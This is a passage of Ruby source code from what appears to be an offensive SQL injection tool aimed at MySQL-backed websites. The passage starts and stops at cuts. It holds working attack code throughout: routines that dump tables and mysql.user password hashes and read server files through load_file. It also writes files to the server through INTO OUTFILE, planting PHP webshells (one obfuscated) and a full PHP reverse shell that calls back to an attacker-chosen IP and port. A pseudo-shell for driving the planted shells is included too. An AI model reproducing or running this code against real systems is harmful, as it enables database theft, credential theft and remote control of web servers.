      if answer.upcase == 'Y' or answer.upcase == 'YES'
        cols = common_columns(db_name, table_name, "#{HOME}fuzz/common_tables.lst")
        if cols.empty?
          print_error("No Columns Found....")
          return nil
        else
          print_good("DB: #{db_name}")
          print_good("Table: #{table_name}")
          print_good("Columns: #{cols.join(', ').sub(/, $/, '')}")
          return cols.join(' ')
        end
      else
        print_error("OK, returning to previous menu....")
        return nil
      end
    else
      # MySQL >= 5
      if db_name =~ /CURRENT-DB|database()|schema()/
        dbn='schema()' if db_name =~ /schema()/
        dbn='database()' unless db_name =~ /schema()/
      else
        dbn=db_name.mysqlhex
      end
      query = "select count(column_name) from information_schema.columns where table_schema=#{dbn} and table_name=#{table_name.mysqlhex}"
      results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, query)
      if results.nil?
        print_error("Unable to determine number of columns in #{table_name}....")
      else
        print_good("Fetching #{results} Columns for #{table_name}...")
      end
      count=0
      columns=[]
      while not results.nil?
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, "select column_name from information_schema.columns where table_schema=#{dbn} and table_name=#{table_name.mysqlhex} limit #{count},1")
	pad = ' ' * (results.size + 25) unless results == '' or results.nil?
	pad = ' ' * 50 if results.nil?
	print "\r(#{count})> #{results}".cyan unless results == ''
	columns << results unless results == ''
	count = count.to_i + 1
      end
      print_line("")
      if columns.empty?
        print_error("Unable to get any columns for #{table_name}!")
        print_error("Lack of privileges? IDK....")
        print_status("Possible Solutions include:")
        print_caution("A) Become HR's best friend by updating the code and sending him a copy")
        print_caution("B) Tweak Settings and try things again")
        print_caution("C) Be a bawz and do it manually")
        print_line("")
      else	
        print_good("DB: #{db_name}")
        print_good("Table: #{table_name}")
        print_good("Columns: #{columns.join(', ').sub(/, $/, '')}")
      end
    end
  end

  # Try to Read Files off backend server
  # Requires privilged user access and ful path
  def read_file(file)
    results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, "load_file(#{file.strip.chomp.mysqlhex})")
    if not results.nil? and not results == ''
      # Log Success for offline review
      logs = RESULTS + $config['INJECTOR']['MYSQL']['URL'].sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
      logdir = logs + '/load_file/'
      # Try to ensure filenames dont end up jacked up, no guarantees :p
      logfile = logdir + file.gsub('/', '_').gsub('\\', '_').gsub(/[;:'",.~`!@#$\%^&*\(\)=\[\]]/, '_')
      Dir.mkdir(logs) unless File.exists?(logs) and File.directory?(logs)
      Dir.mkdir(logdir) unless File.exists?(logdir) and File.directory?(logdir)
      f=File.open(logfile, 'w+')
      f.puts results
      f.close
      print_good("File: #{file}")
      print_status("#########################################################")
      print_line("#{results.chomp}")
      print_status("#########################################################\n")
      return true
    else
      print_error("No results for: #{file}")
      return false
    end
  end

  # Pseudo Shell for Easy File Reading when you know what you want
  # Helpful when you want more than just 1-2 files in a row but not enough to fuzz...
  def read_file_shell
    while(true)
      prompt = "(FileReader)> "
      line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      if cmd =~ /^exit|^quit/i
        print_line("")
        print_error("OK, Returning to Main Menu...")
        break
      else
        read_file(cmd.strip)
        print_line("")
      end
    end
  end

  # LOAD_FILE() File Fuzzer
  # User provides file and we check for existance of content in response
  # Can run through all and display as found, or stop on success
  # Stop feature allows you to strategically bruteforce check for specific files leading to eventual manual mapping of filesystem
  def read_file_fuzz
    print_line("")
    while(true)
      print_caution("File to Fuzz with: ")
      file = gets.strip.chomp
      print_line("")
      if File.exists?(file)
        fuzz = File.open(file).readlines
        print_status("Loaded #{fuzz.size} fuzzies from #{file}....")
        print_caution("Do you want to Stop at First Success (Y/N)?")
        answer=gets.chomp
        if answer.upcase == 'Y' or answer.upcase == 'YES'
          stop=true
        else
          stop=false
        end
        break
      else
        print_error("Can't find or read provided file!")
        print_error("Check path or permissions and try again...")
        print_line("")
      end
    end
    print_status("Fuzzing Backend Files via load_file()....")
    if stop
      while(true)
        fuzz.each do |fuzzy|
          break if read_file(fuzzy.chomp)
        end
        break
      end
    else
      fuzz.each { |fuzzy| read_file(fuzzy.chomp) }
    end
  end

  # Write Files to Target Server using SQLi
  # Requires privileged User
  # This gets the needed info then sends to file_write to finish job
  def file_writer_setup
    reverse=false
    simple=false
    while(true)
      print_caution("Select Payload Option: ")
      print_caution("1) Local File")
      print_caution("2) PHP CMD Shell")
      print_caution("3) PHP Reverse Shell")
      answer=gets.chomp
      print_line("")
      if answer.to_i > 0 and answer.to_i <= 3
        case answer.to_i
        when 1
          while(true)
            print_caution("Path to Local File: ")
            answer=gets.strip.chomp
            print_line("")
            if File.exists?(answer)
              payload=File.open(answer).read
              payload_filename=answer.split('/')[-1]
              break
            else
              print_error("Can't find or read provided file!")
              print_error("Check path or permissions and try again...")
              print_line("")
            end
          end
        when 2
          while(true)
            print_caution("Select PHP Shell Option: ")
            print_caution("1) Simple System($_GET['foo']) Shell")
            print_caution("2) Simple Eval(Base64($_REQUEST['foo'])) Shell")
            print_caution("3) Simple Passthru(Base64($_SERVER[HTTP_FOO])) Shell")
            print_caution("4) Simple Create_function(Base64($_SERVER[HTTP_FOO])) Shell")
            answer=gets.chomp
            print_line("")
            if answer.to_i > 0 and answer.to_i <= 4
              simple=true
              case answer.to_i
              when 1	
                simple_connect=1
                payload="<?error_reporting(0);print(___);system($_GET[foo]);print(___);die;?>"
              when 2
                simple_connect=2
                payload="<?error_reporting(0);print(___);eval(base64_decode($_REQUEST[foo]));print(___);die;?>"
              when 3
                simple_connect=3
                payload="<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_FOO]));print(___);die;?>"
              when 4
                simple_connect=4
                payload="<?error_reporting(0);print(___);$b=strrev(\"edoced_4\".\"6esab\");($var=create_function($var,$b($_SERVER[HTTP_FOO])))?$var():0;print(___);?>"
              end
              payload_filename=randz(8) + '.php'
              break
            else
              print_line("")
              print_error("Oops, Didn't quite understand that one")
              print_error("Please Choose a Valid Option From Menu Below Next Time.....")
              print_line("")
            end
          end
        when 3
          reverse=true
          print_caution("IP: ")
          ip=gets.chomp
          print_line("")
          print_caution("Port: ")
          port=gets.chomp
          print_line("")
          payload_filename=randz(8) + '.php'
          payload = "<?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '#{ip}'; $port = #{port.to_i}; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\"; } }; ?>" # Pentestmonkey's PHP Reverse Shell, Many THanks!
        end
        break
      else
        print_line("")
        print_error("Oops, Didn't quite understand that one")
        print_error("Please Choose a Valid Option From Menu Below Next Time.....")
        print_line("")
      end
    end
    while(true)
      print_caution("Writable Path Options: ")
      print_caution("1) Known Writable Path")
      print_caution("2) Fuzz w/Paths File")
      answer=gets.chomp
      if answer.to_i == 1
        print_caution("Remote Writable Path: ")
        answer=gets.strip.chomp
        remote_paths=[ answer ]
        print_line("")
        break
      elsif answer.to_i == 2
        while(true)
          print_caution("Local File for Fuzzing Writable Path: ")
          answer=gets.strip.chomp
          print_line("")
          if File.exists?(answer.strip.chomp)
            paths=File.open(answer.strip.chomp).readlines
            remote_paths=[]
            paths.each { |x| remote_paths << x }
            break
          else
            print_error("Can't find or read provided file!")
            print_error("Check path or permissions and try again...")
            print_line("")
          end
        end
        break
      else
        print_line("")
        print_error("Oops, Didn't quite understand that one")
        print_error("Please Choose a Valid Option From Menu Below Next Time.....")
        print_line("")
      end
    end
    file_write(remote_paths, payload.mysqlhex, payload_filename)
    if reverse
      print_caution("URL to Trigger Reverse Shell: ")
      answer=gets.chomp
      print_line("")
      print_status("Trying to trigger reverse shell, make sure listener is ready...")
      sleep(3) # Dramatic pause to give a sec for listener prep
      res=@http.get(answer)
      if res[1] == 200
        print_good("200 Response Received!")
        print_good("Hopefully you caught a shell....")
      else
        print_error("Bad Response Received, not sure things went as planned. Sorry.....")
      end
    end
    if simple
      print_caution("Do you want to try and connect to Simple Shell (Y/N)?")
      answer=gets.chomp
      print_line("")
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        print_caution("URL to Shell (http://site.com/images/shellname.php): ")
        url=gets.chomp
        simple_shell(simple_connect.to_i, url)
      else
        print_status("OK, will leave it to you...")
        print_status("In case you were wondering, to connect via Curl: ")
        case simple_connect.to_i
        when 1
          print_line("SYSTEM SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_CMD_HERE>")
        when 2
          print_line("EVAL SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_BASE64_ENCODED_PHP-CMD_HERE>")
        when 3
          print_line("PASSTHRU HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_CMD_HERE>\"")
        when 4
          print_line("CREATE_FUNCTION EVAL HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_PHP-CMD_HERE>\"")
        end
      end
    end
  end

  # Assistant for connecting to shells we wrote
  def simple_shell(id, url)
    print_line("")
    prompt = "(CMD)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^exit|^quit/i
        print_line("")
        print_error("OK, exiting pseudo shell....")
        print_caution("In case you were wondering, to connect via Curl: ")
        case id
        when 1
          print_line("SYSTEM SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_CMD_HERE>")
        when 2
          print_line("EVAL SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_BASE64_ENCODED_PHP-CMD_HERE>")
        when 3
          print_line("PASSTHRU HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_CMD_HERE>\"")
        when 4
          print_line("CREATE_FUNCTION EVAL HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_PHP-CMD_HERE>\"")
        end
        print_error("Returning to Main Menu...")
        break
      else
        case id
        when 1
          link = url + "?foo=#{cmd.space2plus}"
        when 2
          code = Base64.encode64(cmd)
          link = url + "?foo=#{code.chomp}"
        when 3
          code = Base64.encode64(cmd)
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['HTTP']['HTTP_HEADERS'].store('FOO', code.chomp)
          link = url
        when 4
          code = Base64.encode64(cmd)
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['HTTP']['HTTP_HEADERS'].store('FOO', code.chomp)
          link = url
        end
        rez=@http.get(link)
        if rez[0] =~ /___(.+)/m
          res=$1.chomp
          if res != ''
            cmd_results=rez[0].split("__")[1]
            print_line("#{cmd_results.sub('_', '').chomp}") unless cmd_results.nil? or cmd_results == '_'
            print_line("") if cmd_results.nil? or cmd_results == '_'
            print_error("No Results Found in Output!") if cmd_results.nil? or cmd_results == '_'
            print_line("")
          else
            print_line("")
            print_error("No Results Found in Output!")
            print_line("")
          end
        else
          print_line("")
          print_error("No Results Found in Output!")
          print_line("")
        end
        $config['HTTP']['HTTP_HEADERS'].delete('FOO') if $config['HTTP']['HTTP_HEADERS'].keys.include?('FOO')
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
      end
    end
  end

  # Dump the Requested Column Data if we can
  # Logs Results to the Results Directory, in host folder
  # Save as TXT and CSV, /results/HOST/dbname_tblname.(txt||csv)
  def union_data_dump(db_name, table_name, columns, start=0,stop=5)
    data=[] # WE will make an array of arrays to keep things trackable
    titlerow = []
    columns.each { |col| titlerow << col }
    count=0
    badcount=0 #Help us track things when no known count is available
    data << titlerow
    while count.to_i <= stop.to_i
      row_data = []
      columns.each do |col|
        if db_name =~ /CURRENT-DB|database()|schema()/
          results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, "select #{col} from #{table_name} limit #{count},1")
        else
          results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, "select #{col} from #{db_name}.#{table_name} limit #{count},1")
        end
        if results.nil? or results == ''
          row_data << 'NULL' unless count.to_i == stop.to_i
          badcount = badcount.to_i + 1
        else
          row_data << results
          if badcount > 0
            badcount = badcount.to_i - 1
          end
        end
      end
      pad = ' ' * (row_data.size + 25) unless row_data.empty?
      pad = ' ' * 50 if row_data.nil? if row_data.empty?
      print "\r(ROW##{count})> #{row_data.join(',')}#{pad}".cyan unless row_data.empty?
      data << row_data unless row_data.empty?
      if count.to_i == stop.to_i
        break
      elsif badcount.to_i > 5
        print_caution("Noticing a High Number of Empty Values!")
        print_caution("Do you want to continue dumping (Y/N)?")
        answer=gets.chomp
        print_line("")
        if answer.upcase == 'N' or answer.upcase == 'NO'
          print_status("OK, closing down dump session....")
          break
        else
          badcount=0
          print_status("OK, continuing dump session....")
        end
      end
      count = count.to_i + 1
    end
    puts
    if data.size == 1
      print_error("Unable to dump any data for #{db_name}.#{table_name}:#{columns.join(', ').sub(/, $/, '')}!")
      print_error("Lack of privileges? IDK....")
      print_status("Possible Solutions include:")
      print_caution("A) Become HR's best friend by updating the code and sending him a copy")
      print_caution("B) Tweak Settings and try things again")
      print_caution("C) Be a bawz and do it manually")
      print_line("")
    else	
      print_good("DB: #{db_name}")
      print_good("Table: #{table_name}")
      print_good("Columns: #{columns.join(', ').sub(/, $/, '')}")
      pad = (data[0].size * 3) + data[0].size
      strsize = data[0].join().to_s.size
      breaker="\#" * (pad + strsize)
      print_good("#{breaker}")
      table = data.to_table(:first_row_is_head => true)
      print table.to_s.white
      print_good("#{breaker}")
      # Log Success for offline review
      logs = RESULTS + $config['INJECTOR']['MYSQL']['URL'].sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
      logdir = logs + '/dumps/'
      file = "#{db_name}_#{table_name}".gsub('/', '_').gsub('\\', '_').gsub(/[;:'",.~`!@#$\%^&*\(\)=\[\]]/, '_')
      csvfile = logdir + file + '.csv'
      txtfile = logdir + file + '.txt'
      Dir.mkdir(logs) unless File.exists?(logs) and File.directory?(logs)
      Dir.mkdir(logdir) unless File.exists?(logdir) and File.directory?(logdir)
      CSV.open(csvfile, "wb") do |csv|
        data.each { |row| csv << row }
      end
      t=File.open(txtfile, 'w+')
      t.puts "DB: #{db_name}"
      t.puts "Table: #{table_name}"
      t.puts "Columns: #{columns.join(', ').sub(/, $/, '')}"
      t.puts ''
      t.puts table.to_s
      t.close
    end
  end

  # Dump the Users & Passwords if we can
  # Logs Results in table string form to the @passwords var for logging later
  # Returns true if success, false if fails
  def union_password_dump
    columns=[ 'user', 'host', 'password', 'super_priv', 'file_priv' ]
    # Find out how many entries exist, or fail cause we dont have privs
    inj = "SELECT COUNT(#{columns[0]}) FROM mysql.user"
    results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, inj)
    if results.nil? or results == ''
      print_error("Unable to dump any passwords from mysql.user!")
      print_error("Lack of privileges? IDK....")
      print_status("Possible Solutions include:")
      print_caution("A) Become HR's best friend by updating the code and sending him a copy")
      print_caution("B) Tweak Settings and try things again")
      print_caution("C) Be a bawz and do it manually")
      print_line("")
      return false
    else
      entries = results.to_i
    end
    # Now go dump the passwords
    count=0
    titlerow = []
    columns.each { |col| titlerow << col.sub('_priv', '') }
    data=[] # Array of Arrays for table later
    data << titlerow
    while count.to_i < entries.to_i
      row_data = []
      columns.each do |col|
        inj = "SELECT #{col} FROM mysql.user limit #{count}, 1"
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, inj)
        if results.nil? or results == ''
          row_data << 'NULL'
        else
          row_data << results
        end
      end
      pad = ' ' * (row_data.size + 25) unless row_data.empty?
      pad = ' ' * 50 if row_data.nil? if row_data.empty?
      print "\r(ROW##{count})> #{row_data.join(',')}#{pad}".cyan unless row_data.empty?
      data << row_data unless row_data.empty?
      count = count.to_i + 1
    end
    print_line("")
    if data.size == 1
      print_error("Unable to dump any passwords from mysql.user!")
      print_error("Lack of privileges? IDK....")
      print_status("Possible Solutions include:")
      print_caution("A) Become HR's best friend by updating the code and sending him a copy")
      print_caution("B) Tweak Settings and try things again")
      print_caution("C) Be a bawz and do it manually")
      print_line("")
      return false
    else	
      print_good("MySQL Users & Password Dump")
      pad = (data[0].size * 3) + data[0].size
      strsize = data[0].join().to_s.size
      breaker="\#" * (pad + strsize)
      print_good("#{breaker}")
      table = data.to_table(:first_row_is_head => true)
      @target_config['PASSWORDS'] = table.to_s
      print_line("#{@target_config['PASSWORDS']}")
      print_good("#{breaker}")
      return true
    end
  end

  # Save basic injection info to file for proof & safe keeping
  def saveme
    logdir = RESULTS + $config['INJECTOR']['MYSQL']['URL'].sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
    file = logdir + "/union_info.txt"
    if File.exists?(file)
      # backup old copy and move out the way
    end
    Dir.mkdir(logdir) unless File.exists?(logdir) and File.directory?(logdir)
    f=File.open(file, 'w+')
    f.puts "Target: #{$config['INJECTOR']['MYSQL']['URL'].sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]}\n"
    f.puts "Injection Point: #{$config['INJECTOR']['MYSQL']['LOC']}"
    f.puts "Method: Union"
    f.puts "Column Count: #{$config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT']}"
    f.puts "Vulnerable Column: #{$config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN']}\n\n"
    f.puts "GET: #{$config['INJECTOR']['MYSQL']['URL']}" if $config['INJECTOR']['MYSQL']['DATA'].nil? 
    f.puts "POST: #{$config['INJECTOR']['MYSQL']['URL']}" unless $config['INJECTOR']['MYSQL']['DATA'].nil? 
    f.puts "DATA: #{$config['INJECTOR']['MYSQL']['DATA']}" unless $config['INJECTOR']['MYSQL']['DATA'].nil? 
    case $config['INJECTOR']['MYSQL']['LOC']
    when 'UA'
      f.puts "User-Agent: #{$config['INJECTOR']['MYSQL']['UA']}"
    when 'REF'
      f.puts "Referer: #{$config['INJECTOR']['MYSQL']['REF']}"
    when 'HEADER'
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        f.puts "Header Name: #{k}"
        f.puts "Header Value: #{v}"
      end
    when 'COOKIE'
      $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
        f.puts "Cookie Name: #{k}"
        f.puts "Cookie Value: #{v}"
      end
    end
    f.puts "\n\nDBMS: MySQL"
    f.puts "Version: #{@target_config['VERSION']}" unless @target_config['VERSION'].nil?
    f.puts "Host: #{@target_config['HOST']}" unless @target_config['HOST'].nil?
    f.puts "User: #{@target_config['USER']}" unless @target_config['USER'].nil?
    f.puts "Basedir: #{@target_config['BASEDIR']}" unless @target_config['BASEDIR'].nil?
    f.puts "Datadir: #{@target_config['DATADIR']}" unless @target_config['DATADIR'].nil?
    f.puts "Tmpdir: #{@target_config['TMPDIR']}" unless @target_config['TMPDIR'].nil?
    f.puts "DB: #{@target_config['CURRENT_DB']}" unless @target_config['CURRENT_DB'].nil?
    f.puts "DBS: #{@target_config['DBS'].join(', ')}\n\n" unless @target_config['DBS'].empty?
    f.puts "\n\n" if @target_config['DBS'].empty?
    if not @target_config['PASSWORDS'].nil? or @target_config['PASSWORDS'].size != 0
      f.puts "MySQL Users & Passwords:"
      f.puts @target_config['PASSWORDS']
      f.puts "\n\n"
    end
    f.puts "Tables from #{@target_config['CURRENT_DB']}:\n#{@target_config['CDB_TABLES'].join(', ')}\n\n" unless @target_config['CDB_TABLES'].empty?
    if @target_config['DB_TABLES'].size > 1
      count=0
      @target_config['DB_TABLES'].each do |db, tables|
        if count.to_i > 1
          f.puts "Tables from #{db}:\n#{tables.join(', ')}\n\n" unless tables.empty?
        else
          count = count.to_i + 1 #Skip the placeholder foofuck entry....
        end
      end
    end
    f.close
    print_good("Basic info succesfully saved!")
    print_good("Saved to: #{file}")
  end

  # Actual File Writing
  def file_write(paths, payload, filename)
    while(true)
      paths.each do |path|
        count = 1
        inj_str = ' div 0 UNION ALL SELECT ' ############################## IF you do not want to use ' div 0 ' for injection starter change here...
        u_str = $config['INJECTOR']['MYSQL']['UNION']['STR']
        u_str.sub('UNION ALL SELECT ', '').split(',').each do |col|
          if count.to_i == $config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i
            inj_str += "#{payload}" if count.to_i == 1 or count.to_i == $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i
            inj_str += ",#{payload}," unless count.to_i == $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i or count.to_i == 1
          else
            inj_str += "NULL" if count.to_i == 1 or count.to_i == $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i
            inj_str += ",NULL," unless count.to_i == $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i or count.to_i == 1
          end
          count = count.to_i + 1
        end
        writable = path.chomp + filename
        inj_str += " INTO OUTFILE '#{writable}'"

        # Tamper our injection string as needed now that its built
        prep = @tweak.tamper(inj_str.to_s.gsub(',,', ',').sub(' SELECT ,', ' SELECT '))
        prepped = @tweak.space(prep)
        injection_str = @tweak.comma(prepped)

        # Now place injection string in the right spot and send request
        case $config['INJECTOR']['MYSQL']['LOC']
        when 'URL'
          if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
            injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.get(injection)
          else # POST
            injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.post(injection_url, injection_data)
          end
        when 'UA'
          original_ua = $config['HTTP']['HTTP_USER_AGENT']
          $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['HTTP_USER_AGENT'] = original_ua
        when 'REF'
          original_ref = $config['HTTP']['REFERER']
          $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['REFERER'] = original_ref
        when 'HEADER'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        when 'COOKIE'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        end

        if res[1] == 200 and not res[0] =~ /Can't create\/write to file|File '.+' already exists|Errcode: 28|ErrCode 28|Error 28|Errcode: 122|ErrCode 122|Error 122|Errcode: 17|ErrCode 17|Error 17|Errcode: 13|ErrCode 13|Error 13/i
          print_good("Signs seem to indicate things went OK......")
          print_caution("Payload should have been written to: #{writable}")
          break
        elsif res[0] =~ /Can't create\/write to file|File '.+' already exists|Errcode: 28|ErrCode 28|Error 28|Errcode: 122|ErrCode 122|Error 122|Errcode: 17|ErrCode 17|Error 17|Errcode: 13|ErrCode 13|Error 13/i
          print_error("Signs indicate there is a problem writing to this location...")
        else
          print_caution("Success is unclears, maybe things worked but idk....")
        end
      end
      break
    end
  end

  # Runs the actual  Union Injection Requests
  # Provide Vuln Column to inject through & Query you want
  # Returns query_results, or nil
  def union_basic_inject(vuln_column, query)
    count = 1
    m1 = "[#{randz(5)}]"
    m2 = "[#{randz(5)}]"
    u_str = $config['INJECTOR']['MYSQL']['UNION']['STR']
    inj_str = ' div 0 UNION ALL SELECT ' ############################## IF you do not want to use ' div 0 ' for injection starter change here...
    u_str.sub('UNION ALL SELECT ', '').split(',').each do |col|
      if count.to_i == $config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i
        inj_str += ",concat(#{m1.mysqlhex},(#{query}),#{m2.mysqlhex})" if count.to_i == 1 or count.to_i == $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i
        inj_str += ",concat(#{m1.mysqlhex},(#{query}),#{m2.mysqlhex})," unless count.to_i == $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i or count.to_i == 1
      else
        inj_str += "#{col}" if count.to_i == 1 or count.to_i == $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i
        inj_str += ",#{col}," unless count.to_i == $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i or count.to_i == 1
      end
      count = count.to_i + 1
    end

    # Tamper our injection string as needed now that its built
    prep = @tweak.tamper(inj_str.gsub(',,', ',').sub(' SELECT ,', ' SELECT '))
    prepped = @tweak.space(prep)
    injection_str = @tweak.comma(prepped)

    # Now place injection string in the right spot and send request
    case $config['INJECTOR']['MYSQL']['LOC']
    when 'URL'
      if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
        injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
        res = @http.get(injection)
      else # POST
        injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
        injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
        res = @http.post(injection_url, injection_data)
      end

    when 'UA'
      original_ua = $config['HTTP']['HTTP_USER_AGENT']
      $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      $config['HTTP']['HTTP_USER_AGENT'] = original_ua

    when 'REF'
      original_ref = $config['HTTP']['REFERER']
      $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
